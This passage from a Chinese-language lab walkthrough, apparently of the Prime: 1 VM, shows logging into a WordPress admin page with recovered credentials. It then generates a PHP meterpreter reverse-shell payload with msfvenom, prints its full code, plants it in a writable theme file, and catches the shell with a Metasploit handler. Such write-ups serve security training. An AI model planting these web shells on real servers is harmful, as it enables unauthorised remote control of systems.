<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">199.113</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:08

</code></pre> 
<blockquote> 
 <p>获得一个用户名：<br> <strong>victor</strong></p> 
</blockquote> 
<p>综上所述，我们已经获得一个用户和一个密码：</p> 
<table><thead><tr><th>序号</th><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>1</td><td>victor</td><td>follow_the_ippsec</td></tr></tbody></table> 
<h4><a id="322__720"></a>3.2.2 登录管理页</h4> 
<p>信息如下：</p> 
<table><thead><tr><th>序号</th><th>项目</th><th>值</th></tr></thead><tbody><tr><td>1</td><td>后台管理页</td><td>http://192.168.6.162/wordpress/wp-login.php</td></tr><tr><td>2</td><td>用户名</td><td>victor</td></tr><tr><td>3</td><td>用户名</td><td>follow_the_ippsec</td></tr></tbody></table> 
<p><img src="https://images2.imgbox.com/e3/66/g7onuhKD_o.png" alt="管理页登录成功"></p> 
<blockquote> 
 <p>登录成功后台管理页，举例最后的成功，不远了。O(∩_∩)O哈哈~<br> <img src="https://images2.imgbox.com/a6/80/NYSSDiBI_o.png" alt="secret.php"></p> 
</blockquote> 
<blockquote> 
 <p>在这里找到一个secret.php<br> 提示：<strong>“/* ohh Finaly you got a writable file*/”</strong></p> 
</blockquote> 
<h4><a id="323_msfconsole_736"></a>3.2.3 msfconsole</h4> 
<h5><a id="3231_msfvenomshell_737"></a>3.2.3.1 msfvenom生成反弹shell</h5> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.6.66 lport=4567 -o shell.php</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">1113</span> bytes
Saved as: shell.php
                                                                                                                                                  
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># ls</span>
shell.php
                                                                                                                                                  
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># cat shell.php</span>
/*<span class="token operator">&lt;</span>?php /**/ error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string">'192.168.6.66'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4567</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span>$f <span class="token operator">=</span> 'stream_socket_client'<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> is_callable<span class="token punctuation">(</span>$f<span class="token punctuation">))</span></span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token string">"tcp://{<!-- --><span class="token variable">$ip</span>}:{<!-- --><span class="token variable">$port</span>}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> is_callable<span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">))</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span>, <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> is_callable<span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">))</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span>AF_INET, SOCK_STREAM, SOL_TCP<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @socket_connect<span class="token punctuation">(</span><span class="token variable">$s</span>, <span class="token variable">$ip</span>, <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> die<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> die<span class="token punctuation">(</span><span class="token string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> die<span class="token punctuation">(</span><span class="token string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> switch <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">case</span> <span class="token string">'stream'</span><span class="token builtin class-name">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> fread<span class="token punctuation">(</span><span class="token variable">$s</span>, <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'socket'</span><span class="token builtin class-name">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> socket_read<span class="token punctuation">(</span><span class="token variable">$s</span>, <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> die<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$a</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">"Nlen"</span>, <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>strlen<span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> switch <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">case</span> <span class="token string">'stream'</span><span class="token builtin class-name">:</span> <span class="token variable">$b</span> .<span class="token operator">=</span> fread<span class="token punctuation">(</span><span class="token variable">$s</span>, <span class="token variable">$len</span>-strlen<span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">))</span><span class="token punctuation">;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'socket'</span><span class="token builtin class-name">:</span> <span class="token variable">$b</span> .<span class="token operator">=</span> socket_read<span class="token punctuation">(</span><span class="token variable">$s</span>, <span class="token variable">$len</span>-strlen<span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">))</span><span class="token punctuation">;</span> <span class="token builtin class-name">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extension_loaded<span class="token punctuation">(</span><span class="token string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> ini_get<span class="token punctuation">(</span><span class="token string">'suhosin.executor.disable_eval'</span><span class="token punctuation">))</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span>create_function<span class="token punctuation">(</span><span class="token string">''</span>, <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> eval<span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> die<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           

</code></pre> 
<blockquote> 
 <p>已经生成shell.php,将shell.php中注释符号“/*”去除，再将内容复制到上一步的<strong>secret.php</strong>中，</p> 
</blockquote> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/**/</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.6.66'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4567</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tcp://<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$ip</span><span class="token punctuation">}</span></span>:<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$port</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> <span class="token constant">SOCK_STREAM</span><span class="token punctuation">,</span> <span class="token constant">SOL_TCP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">socket_connect</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nlen"</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin.executor.disable_eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/9d/26/8ym9JQGw_o.png" alt="复制shell"><br> 最后点击【<strong>Update File</strong>】<br> <img src="https://images2.imgbox.com/d3/b8/EJG2IZhP_o.png" alt="保存成功"></p> 
<blockquote> 
 <p>提示：“<strong>File edited successfully.</strong>”</p> 
</blockquote> 
<h5><a id="3232_msf4567_769"></a>3.2.3.2 msf监听4567端口</h5> 
<pre><code class="prism language-bash">──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># msfconsole                                                                        </span>
Metasploit tip: Use the resource <span class="token builtin class-name">command</span> to run commands from a <span class="token function">file</span>
                                                  

 ______________________________________________________________________________
<span class="token operator">|</span>                                                                              <span class="token operator">|</span>
<span class="token operator">|</span>                   METASPLOIT CYBER MISSILE COMMAND V5                        <span class="token operator">|</span>
<span class="token operator">|</span>______________________________________________________________________________<span class="token operator">|</span>
      <span class="token punctuation">\</span>                                  /                      /
       <span class="token punctuation">\</span>     <span class="token builtin class-name">.</span>                          /                      /            x
        <span class="token punctuation">\</span>                              /                      /
         <span class="token punctuation">\</span>                            /          +           /
          <span class="token punctuation">\</span>            +             /                      /
           *                        /                      /
                                   /      <span class="token builtin class-name">.</span>               /
    X                             /                      /            X
                                 /                     <span class="token comment">###</span>
                                /                     <span class="token comment"># % #</span>
                               /                       <span class="token comment">###</span>
                      <span class="token builtin class-name">.</span>       /
     <span class="token builtin class-name">.</span>                       /      <span class="token builtin class-name">.</span>            *           <span class="token builtin class-name">.</span>
                            /
                           *
                  +                       *

                                       ^
<span class="token comment">####      __     __     __          #######         __     __     __        ####</span>
<span class="token comment">####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####</span>
<span class="token comment">################################################################################</span>
<span class="token comment">################################################################################</span>
<span class="token comment"># WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #</span>
<span class="token comment">################################################################################</span>
                                                           https://metasploit.com


       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.4.1-dev                           <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2407</span> exploits - <span class="token number">1239</span> auxiliary - <span class="token number">422</span> post       <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">1468</span> payloads - <span class="token number">47</span> encoders - <span class="token number">11</span> nops           <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>

Metasploit Documentation: https://docs.metasploit.com/

msf6 <span class="token operator">&gt;</span> use exploit/multi/handler
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options

Payload options <span class="token punctuation">(</span>php/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Wildcard Target



View the full module info with the info, or info <span class="token parameter variable">-d</span> command.

msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.6.66
LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.6.66
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4567</span>
LPORT <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">4567</span>
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.6.66:4567 

</code></pre> 
<blockquote> 
 <p>监听4567端口成功。</p> 
</blockquote> 
<h5><a id="3233__851"></a>3.2.3.3 访问测试</h5> 
<p>测试地址：http://192.168.6.162/wordpress/wp-content/themes/twentynineteen/secret.php<br> <img src="https://images2.imgbox.com/c1/a6/bNtUT44P_o.png" alt="已经获得反弹shell"><br> 更多测试代码：</p> 
<pre><code class="prism language-bash">meterpreter <span class="token operator">&gt;</span> getuid
Server username: www-data
meterpreter <span class="token operator">&gt;</span> sysinfo
Computer    <span class="token builtin class-name">:</span> ubuntu
OS          <span class="token builtin class-name">:</span> Linux ubuntu <span class="token number">4.10</span>.0-28-generic <span class="token comment">#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64</span>
Meterpreter <span class="token builtin class-name">:</span> php/linux
meterpreter <span class="token operator">&gt;</span> <span class="token function">ls</span>
Listing: /var/www/html/wordpress/wp-content/themes/twentynineteen
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
<span class="token number">100644</span>/rw-r--r--  <span class="token number">840</span>     fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  <span class="token number">404</span>.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1229</span>    fil   <span class="token number">2018</span>-12-19 06:18:26 <span class="token parameter variable">-0500</span>  archive.php
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  classes
<span class="token number">100644</span>/rw-r--r--  <span class="token number">3988</span>    fil   <span class="token number">2018</span>-12-14 06:25:40 <span class="token parameter variable">-0500</span>  comments.php
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  fonts
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1608</span>    fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  footer.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">10035</span>   fil   <span class="token number">2019</span>-01-02 <span class="token number">21</span>:04:50 <span class="token parameter variable">-0500</span>  functions.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1870</span>    fil   <span class="token number">2019</span>-04-16 04:30:54 <span class="token parameter variable">-0400</span>  header.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">2874</span>    fil   <span class="token number">2019</span>-04-16 04:30:54 <span class="token parameter variable">-0400</span>  image.php
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  inc
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1060</span>    fil   <span class="token number">2018</span>-12-19 06:18:26 <span class="token parameter variable">-0500</span>  index.php
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  js
<span class="token number">100644</span>/rw-r--r--  <span class="token number">151698</span>  fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  package-lock.json
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1531</span>    fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  package.json
<span class="token number">100644</span>/rw-r--r--  <span class="token number">765</span>     fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  page.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">219</span>     fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  postcss.config.js
<span class="token number">100644</span>/rw-r--r--  <span class="token number">3949</span>    fil   <span class="token number">2019</span>-02-28 05:47:52 <span class="token parameter variable">-0500</span>  print.css
<span class="token number">100644</span>/rw-r--r--  <span class="token number">3320</span>    fil   <span class="token number">2019</span>-04-07 09:18:52 <span class="token parameter variable">-0400</span>  print.scss
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1735</span>    fil   <span class="token number">2019</span>-05-07 <span class="token number">22</span>:06:56 <span class="token parameter variable">-0400</span>  readme.txt
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  sass
<span class="token number">100644</span>/rw-r--r--  <span class="token number">175535</span>  fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  screenshot.png
